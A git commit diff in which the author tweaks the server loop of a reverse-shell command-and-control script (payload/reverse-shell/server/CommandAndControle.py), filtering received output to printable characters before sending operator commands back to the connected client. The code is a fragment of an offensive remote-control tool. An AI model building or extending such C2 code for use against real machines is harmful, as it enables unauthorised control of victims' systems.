4735823cf26ced5c139bf47089d27049e36c3baf
Qu3b411 <jmohrbutter@gmail.com>
2021-01-05 14:20:09 -0600

    little by little

--- payload/reverse-shell/server/CommandAndControle.py
+++ payload/reverse-shell/server/CommandAndControle.py
@@ -4,6 +4,6 @@ import string;
 import sys
 
 while(True):
-    print(str(server.secure_recv(),'ascii'),end="")
+    print("".join(filter(lambda x: x in string.printable, str(server.secure_recv(),'ascii'))),end="")
     Command = input();
     server.secure_send(Command.encode("utf8"),len(Command))
